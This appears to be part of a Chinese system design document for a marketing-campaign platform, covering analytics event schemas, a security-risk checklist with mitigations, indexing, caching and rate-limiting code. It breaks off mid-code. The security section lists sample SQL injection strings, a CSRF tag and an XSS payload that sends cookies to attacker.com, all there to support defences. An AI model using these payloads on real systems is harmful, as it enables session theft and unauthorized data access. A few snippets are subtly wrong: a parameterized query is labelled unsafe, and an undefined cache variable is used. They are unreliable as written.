| proofCount | int | 凭证数量 | 2 |
| submitDuration | number | 提交时长(秒) | 60 |
| autoSaveCount | int | 自动保存次数 | 1 |
| finalSubmit | boolean | 是否最终提交 | true |

#### 5.3.6 ai_generate
AI生成事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | ai_generate | |
| campaignId | string | 活动ID | uuid |
| taskId | string | 任务ID | uuid |
| generationId | string | 生成ID | uuid |
| generationType | int | 生成类型 | 1 |
| model | string | AI模型 | gpt-4o |
| prompt | string | 提示词 | 生成种草文案 |
| promptTokens | int | 输入token | 200 |
| completionTokens | int | 输出token | 300 |
| totalTokens | int | 总token | 500 |
| cost | number | 成本(元) | 0.005 |
| processingTime | number | 处理时长(ms) | 2500 |
| status | string | 状态 | success, failed |
| errorMessage | string | 错误信息(失败) | rate_limit |
| regenerateCount | int | 重试次数 | 0 |
| userFeedback | string | 用户反馈(重生成) | 再活泼一些 |
| usageMode | string | 使用方式 | auto_use, copy, edit |

#### 5.3.7 copy_text
文本复制事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | copy_text | |
| campaignId | string | 活动ID | uuid |
| taskId | string | 任务ID | uuid |
| contentType | string | 内容类型 | ai_generated, manual_input |
| copySource | string | 复制来源 | ai_result, task_content |
| contentLength | number | 内容长度 | 150 |
| copyPosition | string | 复制位置 | card, textarea |
| platform | string | 目标平台 | wechat, weibo, clipboard |
| useCase | string | 使用场景 | share_to_friend, post_to_moments |

#### 5.3.8 platform_jump
平台跳转事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | platform_jump | |
| campaignId | string | 活动ID | uuid |
| targetPlatform | string | 目标平台 | wechat, mini_program, web |
| targetUrl | string | 目标URL | https://... |
| jumpType | string | 跳转类型 | qr_code, deep_link, url_scheme |
| jumpPosition | string | 触发位置 | activity_rule, reward_detail |
| jumpSuccess | boolean | 跳转是否成功 | true |
| failureReason | string | 失败原因(失败时) | not_installed |

#### 5.3.9 proof_upload
凭证上传事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | proof_upload | |
| campaignId | string | 活动ID | uuid |
| taskId | string | 任务ID | uuid |
| submissionId | string | 提交ID | uuid |
| proofType | string | 凭证类型 | photo, screenshot |
| fileType | string | 文件类型 | image, video |
| fileSize | number | 文件大小(bytes) | 1024000 |
| width | int | 图片宽度 | 1920 |
| height | int | 图片高度 | 1080 |
| uploadDuration | number | 上传时长(ms) | 3000 |
| uploadMethod | string | 上传方式 | local, cloud_storage |
| cdnUrl | string | CDN URL | https://cdn.xxx.com/xxx.jpg |
| compressionRate | number | 压缩率 | 0.8 |

#### 5.3.10 review_approved
审核通过事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | review_approved | |
| submissionId | string | 提交ID | uuid |
| campaignId | string | 活动ID | uuid |
| campaignName | string | 活动名称 | 618活动 |
| taskId | string | 任务ID | uuid |
| taskNo | int | 任务序号 | 1 |
| userId | string | 用户ID | uuid |
| reviewerId | string | 审核员ID | uuid |
| reviewerName | string | 审核员姓名 | 审核员 |
| reviewDuration | number | 审核时长(ms) | 5000 |
| reviewRemark | string | 审核备注 | 符合规范 |
| aiScore | number | AI评分(如有) | 95 |
| autoReview | boolean | 是否自动审核 | false |

#### 5.3.11 review_rejected
审核拒绝事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | review_rejected | |
| submissionId | string | 提交ID | uuid |
| campaignId | string | 活动ID | uuid |
| taskId | string | 任务ID | uuid |
| taskNo | int | 任务序号 | 1 |
| userId | string | 用户ID | uuid |
| reviewerId | string | 审核员ID | uuid |
| reviewerName | string | 审核员姓名 | 审核员 |
| rejectReason | string | 拒绝原因 | 图片不清晰 |
| rejectReasonType | string | 原因类型 | quality, content, compliance |
| resubmissionAllowed | boolean | 是否允许重提 | true |
| reviewDuration | number | 审核时长(ms) | 3000 |

#### 5.3.12 reward_claimed
奖励领取事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | reward_claimed | |
| claimId | string | 领取ID | uuid |
| claimNo | string | 领取编号 | RC202406010001 |
| campaignId | string | 活动ID | uuid |
| campaignName | string | 活动名称 | 618活动 |
| rewardId | string | 奖励ID | uuid |
| rewardType | int | 奖励类型 | 1 |
| rewardName | string | 奖励名称 | 优惠券 |
| rewardValue | number | 奖励值 | 10.00 |
| couponCode | string | 券码 | COUPON123 |
| tasksCompleted | int | 完成任务数 | 3 |
| claimSource | string | 领取来源 | task_complete, manual |
| availableRewards | int | 当时可用奖励数 | 2 |
| claimInterval | number | 距上次领取(秒) | 86400 |
| expireAt | string | 过期时间 | 2024-07-01T00:00:00Z |

#### 5.3.13 reward_used
奖励使用事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | reward_used | |
| claimId | string | 领取ID | uuid |
| claimNo | string | 领取编号 | RC202406010001 |
| campaignId | string | 活动ID | uuid |
| rewardId | string | 奖励ID | uuid |
| rewardType | int | 奖励类型 | 1 |
| rewardValue | number | 奖励值 | 10.00 |
| merchantId | string | 商家ID | uuid |
| merchantName | string | 商家名称 | 某某商家 |
| storeId | string | 使用门店ID | uuid |
| storeName | string | 使用门店名称 | 某某店 |
| useTransactionNo | string | 核销交易号 | ORDER123456 |
| orderAmount | number | 订单金额 | 100.00 |
| discountAmount | number | 优惠金额 | 10.00 |
| actualPayment | number | 实付金额 | 90.00 |
| verifyMethod | string | 核销方式 | qr_code, manual |
| verifyDevice | string | 核销设备 | POS, H5, App |
| timeFromClaim | number | 领取到使用时长(小时) | 48 |

#### 5.3.14 alliance_coupon_clicked
异业优惠券点击事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | alliance_coupon_clicked | |
| couponId | string | 优惠券ID | uuid |
| couponName | string | 优惠券名称 | 新客专享券 |
| couponType | int | 券类型 | 1 |
| faceValue | number | 面值 | 20.00 |
| partnerId | string | 异业商家ID | uuid |
| partnerName | string | 异业商家名称 | 合作方 |
| campaignId | string | 关联活动ID | uuid |
| userId | string | 用户ID | uuid |
| clickPosition | string | 点击位置 | coupon_list, campaign_detail, store_detail |
| pageName | string | 页面名称 | coupon_detail |
| viewDuration | number | 查看时长(秒) | 10 |
| alreadyClaimed | boolean | 是否已领取 | false |
| claimStatus | string | 领取状态 | claimable, not_started, expired |
| distance | number | 距离(km) | 1.5 |

#### 5.3.15 share_invite
分享邀请事件

| 字段 | 类型 | 说明 | 示例 |
|------|------|------|------|
| eventType | string | share_invite | |
| campaignId | string | 活动ID | uuid |
| campaignName | string | 活动名称 | 618活动 |
| shareType | string | 分享类型 | activity, reward, task |
| shareContent | string | 分享内容类型 | poster, link, text |
| shareChannel | string | 分享渠道 | wechat_friend, moments, qr_code |
| sharePlatform | string | 分享平台 | wechat, weibo, qr |
| shareTitle | string | 分享标题 | 限时活动 |
| shareDescription | string | 分享描述 | 参与活动赢大奖 |
| shareUrl | string | 分享链接 | https://... |
| qrCodeGenerated | boolean | 是否生成二维码 | true |
| posterGenerated | boolean | 是否生成海报 | false |
| posterDownloaded | boolean | 海报是否下载 | false |
| clickCount | int | 链接点击次数 | 0 |
| newUserCount | int | 带来的新用户数 | 0 |
| conversionRate | number | 转化率 | 0 |

---

## 6. 安全风险清单

### 6.1 SQL注入

**风险描述:**
攻击者通过在用户输入中注入恶意SQL代码,绕过认证或获取未授权数据。

**风险等级:** 高

**攻击示例:**
```
手机号输入: 13800138000' OR '1'='1
活动ID: uuid' UNION SELECT * FROM users--
```

**缓解方案:**

1. **使用参数化查询(Prisma ORM)**
```typescript
// ✅ 正确 - Prisma参数化查询
const users = await prisma.user.findMany({
  where: {
    phone: phoneInput  // Prisma自动转义
  }
});

// ❌ 错误 - 字符串拼接
const users = await prisma.$queryRaw`
  SELECT * FROM users WHERE phone = ${phoneInput}
`;
```

2. **输入验证**
```typescript
// 手机号格式验证
const phoneRegex = /^1[3-9]\d{9}$/;
if (!phoneRegex.test(phone)) {
  throw new Error('Invalid phone format');
}

// UUID格式验证
const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
if (!uuidRegex.test(id)) {
  throw new Error('Invalid ID format');
}
```

3. **数据库权限控制**
- 应用数据库用户只拥有最小必要权限(DML only, 无DDL)
- 分离只读用户用于查询

4. **SQL日志监控**
- 记录所有原始SQL(脱敏后)
- 异常SQL模式检测告警

### 6.2 XSS(跨站脚本攻击)

**风险描述:**
攻击者注入恶意JavaScript代码,在其他用户浏览时执行,窃取Cookie/Session或篡改页面。

**风险等级:** 高

**攻击示例:**
```html
<!-- 昵称输入 -->
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

<!-- 评论内容 -->
<img src=x onerror="alert('XSS')">
```

**缓解方案:**

1. **输入过滤**
```typescript
import DOMPurify from 'isomorphic-dompurify';

function sanitizeInput(input: string): string {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
  });
}
```

2. **输出编码**
```typescript
// 模板引擎自动转义
// Vue/React默认转义
// 手動轉義
function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return text.replace(/[&<>"'/]/g, char => map[char]);
}
```

3. **Content Security Policy**
```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' https: data:;
  connect-src 'self' https://api.xxx.com;
```

4. **HTTP Headers**
```typescript
// security headers
headers: {
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'X-XSS-Protection': '1; mode=block',
}
```

### 6.3 CSRF(跨站请求伪造)

**风险描述:**
攻击者诱导已登录用户访问恶意页面,通过用户已登录的身份发起伪造请求。

**风险等级:** 中

**攻击示例:**
```html
<!-- 恶意页面 -->
<img src="https://api.example.com/rewards/claim?rewardId=xxx">
```

**缓解方案:**

1. **CSRF Token**
```typescript
// 生成CSRF Token
const csrfToken = crypto.randomBytes(32).toString('hex');

// 验证CSRF Token
function validateCsrfToken(token: string, sessionToken: string): boolean {
  return crypto.timingSafeEqual(
    Buffer.from(token),
    Buffer.from(sessionToken)
  );
}

// 前端请求时携带
fetch('/api/rewards/claim', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
  },
  credentials: 'include',
});
```

2. **SameSite Cookie**
```typescript
// Cookie设置
Set-Cookie: sessionId=xxx; HttpOnly; Secure; SameSite=Strict
```

3. **Origin/Referer检查**
```typescript
function validateOrigin(origin: string): boolean {
  const allowedOrigins = ['https://app.example.com', 'https://xxx.miniapp.com'];
  return allowedOrigins.includes(origin);
}
```

### 6.4 权限绕过

**风险描述:**
用户通过修改参数访问未授权资源,如修改URL中的ID访问他人数据。

**风险等级:** 高

**攻击示例:**
```
# 修改campaignId访问其他商家活动
GET /api/campaigns/attacker-controlled-uuid

# 修改userId查看他人信息  
GET /api/users/another-user-uuid
```

**缓解方案:**

1. **资源所有权验证**
```typescript
// 中间件: 验证用户是否有权访问该资源
async function checkCampaignAccess(req, res, next) {
  const campaignId = req.params.campaignId;
  const user = req.user;
  
  // 平台管理员可以访问所有
  if (user.role === 'platform_admin') return next();
  
  // 获取活动信息
  const campaign = await prisma.campaign.findUnique({
    where: { id: campaignId },
    include: { merchant: true }
  });
  
  if (!campaign) {
    return res.status(404).json({ code: 404, message: 'Not found' });
  }
  
  // 商家管理员只能访问自己的商家
  if (user.role === 'merchant_admin' && 
      campaign.merchantId !== user.merchantId) {
    return res.status(403).json({ code: 403, message: 'Forbidden' });
  }
  
  // 存储merchantId供后续使用
  req.merchantId = campaign.merchantId;
  next();
}
```

2. **行级安全(RLS)**
```sql
-- PostgreSQL行级安全策略
ALTER TABLE task_submissions ENABLE ROW LEVEL SECURITY;

CREATE POLICY merchant_can_view_own ON task_submissions
  FOR SELECT
  TO authenticated
  USING (
    -- 自己可以查看自己的提交
    user_id = current_user_id()
    OR 
    -- 商家管理员可以查看商家的所有提交
    campaign_id IN (
      SELECT id FROM campaigns WHERE merchant_id = current_merchant_id()
    )
  );
```

3. **参数污染检测**
```typescript
// 检测异常参数
function detectParameterPollution(req): boolean {
  const suspiciousParams = Object.keys(req.query).filter(
    key => Array.isArray(req.query[key])
  );
  if (suspiciousParams.length > 0) {
    logger.warn('Potential parameter pollution', { params: suspiciousParams });
    return true;
  }
  return false;
}
```

### 6.5 数据泄露

**风险描述:**
敏感数据(如手机号、身份证、密码)被未授权访问或泄露。

**风险等级:** 高

**泄露场景:**

1. **API返回敏感字段**
```typescript
// ❌ 错误 - 返回敏感字段
const user = await prisma.user.findUnique({ where: { id } });
res.json({ phone: user.phone, idCard: user.idCard });

// ✅ 正确 - 选择性返回
const user = await prisma.user.findUnique({
  where: { id },
  select: { id: true, phone: true, nickname: true, avatarUrl: true }
});
```

2. **日志泄露**
```typescript
// ❌ 错误 - 日志记录敏感信息
logger.info('User login', { phone: '13800138000', password: 'xxx' });

// ✅ 正确 - 脱敏日志
logger.info('User login', { phone: '138****8000', action: 'login' });
```

**缓解方案:**

1. **字段级加密**
```typescript
// 使用pgcrypto加密敏感字段
// 在Prisma迁移或原始SQL中
ALTER TABLE users ADD COLUMN id_card_encrypted bytea;

// 加密函数
CREATE OR REPLACE FUNCTION encrypt_field(text) 
RETURNS bytea AS $$
  SELECT pgp_sym_encrypt($1, current_setting('app.secret_key'));
$$ LANGUAGE SQL;

// 解密函数
CREATE OR REPLACE FUNCTION decrypt_field(bytea) 
RETURNS text AS $$
  SELECT pgp_sym_decrypt($1, current_setting('app.secret_key'));
$$ LANGUAGE SQL;
```

2. **数据脱敏**
```typescript
function maskPhone(phone: string): string {
  return phone.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2');
}

function maskIdCard(idCard: string): string {
  return idCard.replace(/(\d{6})\d{8}(\d{4})/, '$1********$2');
}
```

3. **访问审计**
```typescript
// 记录所有敏感数据访问
async function logDataAccess(userId: string, resource: string, resourceId: string) {
  await prisma.auditLog.create({
    data: {
      auditType: 'data_access',
      targetId: resourceId,
      targetType: resource,
      operatorId: userId,
      action: 1, // 访问
      ipAddress: getClientIP(),
    }
  });
}
```

4. **定期安全扫描**
- 使用sqldiff检测数据库变更
- 定期扫描敏感字段暴露
- API安全测试

### 6.6 API滥用

**风险描述:**
恶意用户通过大量请求耗尽资源、暴力破解或绕过业务限制。

**风险等级:** 中

**滥用场景:**

1. **暴力破解验证码**
2. **短信轰炸**
3. **刷接口**
4. **爬虫爬取数据**

**缓解方案:**

1. **请求限流**
```typescript
// Redis滑动窗口限流
const rateLimiter = {
  async check(identifier: string, limit: number, window: number): Promise<boolean> {
    const key = `rate_limit:${identifier}`;
    const now = Date.now();
    const windowStart = now - window;
    
    // 移除窗口外的记录
    await redis.zremrangebyscore(key, 0, windowStart);
    
    // 获取当前窗口内请求数
    const count = await redis.zcard(key);
    
    if (count >= limit) {
      return false; // 超出限制
    }
    
    // 添加新请求
    await redis.zadd(key, now, `${now}-${Math.random()}`);
    await redis.expire(key, Math.ceil(window / 1000));
    
    return true;
  }
};

// 限流配置
const rateLimits = {
  '/api/auth/login': { limit: 5, window: 900 },      // 15分钟内5次
  '/api/auth/send-code': { limit: 3, window: 3600 }, // 1小时内3次
  '/api/ai/generate': { limit: 20, window: 3600 },  // 1小时内20次
  default: { limit: 100, window: 3600 },            // 默认1小时100次
};
```

2. **验证码机制**
```typescript
// 图形验证码
const captcha = await captchaService.generate();
res.json({ captchaId: captcha.id, image: captcha.image });

// 验证
await captchaService.verify(captchaId, captchaValue);
```

3. **IP黑名单**
```typescript
// 异常IP自动封禁
async function checkAndBlockSuspiciousIP(ip: string) {
  const key = `suspicious_ip:${ip}`;
  const count = await redis.incr(key);
  
  if (count === 1) {
    await redis.expire(key, 3600);
  }
  
  if (count > 100) { // 1小时内超过100次异常
    await redis.sadd('blocked_ips', ip);
    logger.warn(`IP blocked due to suspicious activity: ${ip}`);
  }
}
```

4. **业务限流**
```typescript
// 每个用户每小时最多提交10次
async function checkSubmissionLimit(userId: string): Promise<boolean> {
  const count = await prisma.taskSubmission.count({
    where: {
      userId,
      createdAt: { gte: new Date(Date.now() - 3600000) }
    }
  });
  
  if (count >= 10) {
    throw new Error('提交过于频繁,请稍后再试');
  }
  
  return true;
}
```

### 6.7 刷单/刷奖励

**风险描述:**
恶意用户通过模拟真实用户行为骗取奖励,造成活动预算损失。

**风险等级:** 高

**刷单特征:**

1. 同一设备/用户短时间多次参与
2. 提交内容高度相似或重复
3. 位置信息异常(虚拟定位)
4. 设备指纹重复
5. 行为模式异常(间隔时间固定)

**缓解方案:**

1. **设备指纹识别**
```typescript
interface DeviceFingerprint {
  deviceId: string;
  browserFingerprint: string;
  canvasFingerprint: string;
  webglFingerprint: string;
}

// 生成设备指纹
function generateDeviceFingerprint(req: Request): string {
  const components = [
    req.headers['user-agent'],
    req.headers['accept-language'],
    req.headers['accept-encoding'],
    getClientIP(req),
    // 前端采集的浏览器指纹
    req.body.fingerprint?.canvas,
    req.body.fingerprint?.webgl,
  ];
  
  return crypto.createHash('sha256').update(components.join()).digest('hex');
}
```

2. **行为验证**
```typescript
// 任务完成时间验证(真实用户需要一定时间)
function validateTaskDuration(startTime: Date, submitTime: Date, minDuration: number): boolean {
  const duration = submitTime.getTime() - startTime.getTime();
  return duration >= minDuration; // 至少需要一定时间
}

// 检查操作间隔
function checkOperationInterval(userId: string, action: string, minInterval: number): boolean {
  const lastAction = await redis.get(`last_action:${userId}:${action}`);
  if (lastAction) {
    const elapsed = Date.now() - parseInt(lastAction);
    if (elapsed < minInterval) {
      return false; // 操作太频繁
    }
  }
  await redis.set(`last_action:${userId}:${action}`, Date.now());
  return true;
}
```

3. **位置验证**
```typescript
// 门店位置与提交位置距离验证
async function validateLocation(
  storeId: string, 
  userLat: number, 
  userLng: number,
  maxDistance: number = 500 // 最大允许距离(m)
): Promise<boolean> {
  const store = await prisma.store.findUnique({ where: { id: storeId } });
  
  if (!store.longitude || !store.latitude) {
    return true; // 门店未配置位置,不验证
  }
  
  const distance = calculateDistance(
    store.latitude, store.longitude,
    userLat, userLng
  );
  
  return distance <= maxDistance;
}

function calculateDistance(lat1: number, lng1: number, lat2: number, lng2: number): number {
  // Haversine公式计算两点间距离
  const R = 6371000; // 地球半径(m)
  const dLat = toRad(lat2 - lat1);
  const dLng = toRad(lng2 - lng1);
  const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
            Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
            Math.sin(dLng/2) * Math.sin(dLng/2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  return R * c;
}
```

4. **内容查重**
```typescript
// 提交内容相似度检测
async function checkContentSimilarity(
  userId: string,
  campaignId: string,
  newContent: string
): Promise<{similar: boolean, similarity: number}> {
  // 获取该用户最近N条提交
  const recentSubmissions = await prisma.taskSubmission.findMany({
    where: { userId, campaignId },
    orderBy: { createdAt: 'desc' },
    take: 10,
    select: { content: true }
  });
  
  if (recentSubmissions.length === 0) {
    return { similar: false, similarity: 0 };
  }
  
  // 计算相似度(使用Jaccard相似度或余弦相似度)
  const newContentTokens = tokenize(newContent);
  
  for (const sub of recentSubmissions) {
    if (!sub.content) continue;
    const similarity = calculateSimilarity(newContentTokens, tokenize(sub.content));
    if (similarity > 0.8) {
      return { similar: true, similarity };
    }
  }
  
  return { similar: false, similarity: 0 };
}
```

5. **风险评分**
```typescript
interface RiskScore {
  total: number;
  factors: {
    deviceRepeat: boolean;
    locationAnomaly: boolean;
    contentSimilar: boolean;
    timeAnomaly: boolean;
    frequencyAnomaly: boolean;
  };
}

async function calculateRiskScore(userId: string, submission: Submission): Promise<RiskScore> {
  const factors = {
    deviceRepeat: await checkDeviceRepeat(userId, submission.deviceFingerprint),
    locationAnomaly: !await validateLocation(submission.storeId, submission.lat, submission.lng),
    contentSimilar: (await checkContentSimilarity(userId, submission.campaignId, submission.content)).similar,
    timeAnomaly: submission.duration < 5000, // 5秒内完成
    frequencyAnomaly: !await checkSubmissionLimit(userId),
  };
  
  const total = Object.values(factors).filter(Boolean).length * 20; // 每项20分
  
  return { total, factors };
}

// 高风险用户直接拦截或人工审核
async function processSubmission(submission: Submission) {
  const riskScore = await calculateRiskScore(userId, submission);
  
  if (riskScore.total >= 60) {
    await prisma.taskSubmission.update({
      where: { id: submission.id },
      data: { status: 1, reviewRemark: `风险评分:${riskScore.total},需人工审核` }
    });
    // 发送告警
    await sendRiskAlert(userId, riskScore);
  }
}
```

6. **人工审核机制**
```typescript
// 高风险提交进入人工审核池
async function addToReviewQueue(submissionId: string, priority: 'low' | 'medium' | 'high') {
  await redis.zadd(
    'review_queue',
    priority === 'high' ? 1 : priority === 'medium' ? 2 : 3,
    submissionId
  );
}
```

---

## 7. 性能考虑

### 7.1 数据库索引策略

#### 7.1.1 索引设计原则

1. **高频查询字段优先建立索引**
2. **区分度高的字段优先**(区分度 = 不同值数量/总行数)
3. **避免过多索引**(写入时维护成本)
4. **复合索引遵循最左前缀原则**

#### 7.1.2 核心索引配置

```sql
-- 用户表索引
CREATE INDEX idx_users_phone ON users(phone);
CREATE INDEX idx_users_openid ON users(openid);
CREATE INDEX idx_users_status ON users(status);

-- 商家表索引
CREATE INDEX idx_merchants_status ON merchants(status);
CREATE INDEX idx_merchants_category ON merchants(category);
CREATE INDEX idx_merchants_location ON merchants(province, city);

-- 门店表索引
CREATE INDEX idx_stores_merchant_id ON stores(merchant_id);
CREATE INDEX idx_stores_location ON stores(longitude, latitude);

-- 活动表索引
CREATE INDEX idx_campaigns_merchant_id ON campaigns(merchant_id);
CREATE INDEX idx_campaigns_status ON campaigns(status);
CREATE INDEX idx_campaigns_time ON campaigns(start_time, end_time);

-- 任务提交表索引(高频查询)
CREATE INDEX idx_task_submissions_user_campaign ON task_submissions(user_id, campaign_id);
CREATE INDEX idx_task_submissions_task_status ON task_submissions(task_id, status);
CREATE INDEX idx_task_submissions_store_created ON task_submissions(store_id, created_at);
CREATE INDEX idx_task_submissions_reviewed_by ON task_submissions(reviewed_by);

-- NFC触碰表索引
CREATE INDEX idx_nfc_taps_card_time ON nfc_taps(card_id, created_at);
CREATE INDEX idx_nfc_taps_store_time ON nfc_taps(store_id, created_at);

-- 事件表索引(分区表)
CREATE INDEX idx_events_user_time ON events(user_id, server_time);
CREATE INDEX idx_events_session_time ON events(session_id, server_time);
CREATE INDEX idx_events_type_time ON events(event_type, server_time);
```

#### 7.1.3 索引优化

```sql
-- 查看索引使用情况
SELECT 
  indexrelname,
  idx_scan,
  idx_tup_read,
  idx_tup_fetch
FROM pg_stat_user_indexes
WHERE schemaname = 'public';

-- 分析慢查询
SELECT 
  query,
  calls,
  mean_time,
  total_time
FROM pg_stat_statements
ORDER BY mean_time DESC
LIMIT 10;

-- 查看未使用的索引
SELECT 
  indexrelname
FROM pg_stat_user_indexes
WHERE idx_scan = 0
AND schemaname = 'public';
```

### 7.2 缓存策略

#### 7.2.1 缓存层级

```
┌─────────────────────────────────────┐
│           CDN (静态资源)             │
└─────────────────────────────────────┘
                  ↓
┌─────────────────────────────────────┐
│      Redis (热点数据/会话)           │
│  - Session                           │
│  - Token                              │
│  - 活动基础信息                       │
│  - 用户权限                           │
│  - 限流计数                           │
│  - 排行榜                             │
└─────────────────────────────────────┘
                  ↓
┌─────────────────────────────────────┐
│      PostgreSQL (主数据库)           │
└─────────────────────────────────────┘
```

#### 7.2.2 Redis缓存模式

```typescript
// 缓存键命名规范
// {entity}:{id}:{field}
// campaign:{id}:info
// user:{id}:profile

// 缓存模板
const cacheTemplates = {
  userProfile: 'user:{userId}:profile',
  userPermissions: 'user:{userId}:permissions',
  campaignInfo: 'campaign:{campaignId}:info',
  campaignTasks: 'campaign:{campaignId}:tasks',
  merchantInfo: 'merchant:{merchantId}:info',
  storeInfo: 'store:{storeId}:info',
  nfcCardInfo: 'nfc:card:{cardId}:info',
  rateLimit: 'rate_limit:{identifier}:{endpoint}',
  session: 'session:{sessionId}',
  token: 'token:{tokenId}',
};
```

#### 7.2.3 缓存策略实现

```typescript
// CacheService
class CacheService {
  private redis: Redis;
  private defaultTTL = 3600; // 1小时
  
  // 读取缓存
  async get<T>(key: string): Promise<T | null> {
    const data = await this.redis.get(key);
    return data ? JSON.parse(data) : null;
  }
  
  // 写入缓存
  async set(key: string, value: any, ttl?: number): Promise<void> {
    const data = JSON.stringify(value);
    await this.redis.setex(key, ttl || this.defaultTTL, data);
  }
  
  // 删除缓存
  async del(key: string): Promise<void> {
    await this.redis.del(key);
  }
  
  // 缓存失效(支持通配符)
  async invalidatePattern(pattern: string): Promise<void> {
    const keys = await this.redis.keys(pattern);
    if (keys.length > 0) {
      await this.redis.del(...keys);
    }
  }
  
  // 缓存击穿(单用户大量请求同一条不存在的数据)
  async getOrSet<T>(
    key: string, 
    fetcher: () => Promise<T>, 
    ttl?: number
  ): Promise<T> {
    const cached = await this.get<T>(key);
    if (cached !== null) return cached;
    
    const data = await fetcher();
    await this.set(key, data, ttl);
    return data;
  }
  
  // 缓存雪崩(大量key同时过期)
  async setWithJitter(key: string, value: any, baseTTL?: number): Promise<void> {
    const ttl = (baseTTL || this.defaultTTL) + Math.floor(Math.random() * 300);
    await this.set(key, value, ttl);
  }
}

// 活动信息缓存
async function getCampaignInfo(campaignId: string) {
  const cacheKey = `campaign:${campaignId}:info`;
  
  return cacheService.getOrSet(cacheId, async () => {
    const campaign = await prisma.campaign.findUnique({
      where: { id: campaignId },
      select: {
        id: true,
        name: true,
        coverImage: true,
        startTime: true,
        endTime: true,
        status: true,
        rules: true,
      }
    });
    return campaign;
  }, 300); // 5分钟
  
  // 更新时删除缓存
  // await cacheService.del(cacheKey);
}

// 分布式锁(防止并发问题)
async function withLock<T>(
  key: string, 
  fn: () => Promise<T>, 
  ttl = 5000
): Promise<T> {
  const lockKey = `lock:${key}`;
  const lockValue = crypto.randomUUID();
  
  const acquired = await redis.set(lockKey, lockValue, 'PX', ttl, 'NX');
  if (!acquired) {
    throw new Error('Failed to acquire lock');
  }
  
  try {
    return await fn();
  } finally {
    // 释放锁(Lua脚本保证原子性)
    await redis.eval(
      `if redis.call("get", KEYS[1]) == ARGV[1] then return redis.call("del", KEYS[1]) else return 0 end`,
      1, lockKey, lockValue
    );
  }
}
```

#### 7.2.4 缓存预热

```typescript
// 定时任务 - 缓存预热
cron.schedule('0 5 * * *', async () => {
  // 预热热门活动缓存
  const hotCampaigns = await prisma.campaign.findMany({
    where: { status: 2 }, // 进行中
    orderBy: { participationCount: 'desc' },
    take: 100,
  });
  
  for (const campaign of hotCampaigns) {
    await getCampaignInfo(campaign.id);
  }
  
  logger.info(`Pre-warmed ${hotCampaigns.length} campaign caches`);
});
```

### 7.3 API限流

#### 7.3.1 多层限流策略

```
请求 → 防火墙 → API网关 → 应用层 → 业务层
                  ↓           ↓
            熔断器        限流器
```

#### 7.3.2 限流配置

```typescript
// 限流策略配置
const rateLimitConfig = {
  // 认证相关 - 严格限制
  '/api/auth/login': {
    windowMs: 15 * 60 * 1000,  // 15分钟
    maxRequests: 5,
    keyGenerator: (req) => getClientIP(req),
  },
  '/api/auth/send-code': {
    windowMs: 60 * 60 * 1000,  // 1小时
    maxRequests: 3,
    keyGenerator: (req) => req.body.phone,
  },
  
  // AI生成 - 资源密集型
  '/api/ai/generate': {
    windowMs: 60 * 60 * 1000,
    maxRequests: 20,
    keyGenerator: (req) => req.user.id,
  },
  
  // 任务提交 - 业务限制
  '/api/submissions': {
    windowMs: 60 * 1000,
    maxRequests: 10,
    keyGenerator: (req) => req.user.id,
  },
  
  // 奖励领取 - 业务限制
  '/api/rewards/claim': {
    windowMs: 60 * 1000,
    maxRequests: 5,
    keyGenerator: (req) => req.user.id,
  },
  
  // NFC触碰
  '/api/nfc/tap': {
    windowMs: 60 * 1000,
    maxRequests: 30,
    keyGenerator: (req) => req.body.cardUid || getClientIP(req),
  },
  
  // 数据分析导出
  '/api/analytics/export': {
    windowMs: 60 * 60 * 1000,
    maxRequests: 10,
    keyGenerator: (req) => req.user.id,
  },
  
  // 默认策略
  default: {
    windowMs: 60 * 60 * 1000,
    maxRequests: 1000,
    keyGenerator: (req) => req.user?.id || getClientIP(req),
  },
};
```

#### 7.3.3 限流中间件实现

```typescript
import Redis from 'ioredis';

class RateLimiter {
  private redis: Redis;
  
  constructor(redis: Redis) {
    this.redis = redis;
  }
  
  async check(
    identifier: string,
    limit: number,
    windowMs: number
  ): Promise<{ allowed: boolean; remaining: number; resetAt: number }> {
    const key = `ratelimit:${identifier}`;
    const now = Date.now();
    const windowStart = now - windowMs;
    
    // 使用Redis事务保证原子性
    const multi = this.redis.multi();
    
    // 移除窗口外的记录
    multi.zremrangebyscore(key, 0, windowStart);
    // 添加当前请求
    multi.zadd(key, now, `${now}:${Math.random()}`);
    // 设置过期时间
    multi.expire(key, Math.ceil(windowMs / 1000));
    // 获取当前窗口内请求数
    multi.zcard(key);
    
    const results = await multi.exec();
    const currentCount = results[3][1] as number;
    
    const allowed = currentCount <= limit;
    const remaining = Math.max(0, limit - currentCount);
    const resetAt = now + windowMs;
    
    return { allowed, remaining, resetAt };
  }
}

// 限流中间件
async function rateLimitMiddleware(req, res, next) {
  const config = rateLimitConfig[req.path] || rateLimitConfig.default;
  const identifier = config.keyGenerator(req);
  
  const result = await rateLimiter.check(
    identifier,
    config.maxRequests,
    config.windowMs
  );
  
  // 设置响应头
